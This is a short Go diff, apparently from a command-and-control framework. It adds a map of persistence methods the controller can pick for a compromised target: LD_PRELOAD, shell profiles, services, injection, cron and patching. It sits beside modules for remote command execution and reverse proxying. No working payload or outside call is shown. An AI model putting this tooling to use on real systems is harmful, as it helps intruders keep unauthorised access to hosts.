@@ -125,6 +125,16 @@ const (
 	ModREVERSEPROXY = "reverse_proxy"
 )
 
+// PersistMethods CC calls one of these methods to get persistence, or all of them at once
+var PersistMethods = map[string]string{
+	"ld_preload": "ldPreload",
+	"profiles":   "profiles",
+	"service":    "service",
+	"injector":   "injector",
+	"cron":       "cronJob",
+	"patcher":    "patcher",
+}
+
 // Module help info
 var ModuleDocs = map[string]string{
 	ModCMD_EXEC:     "Run a single command on a target",
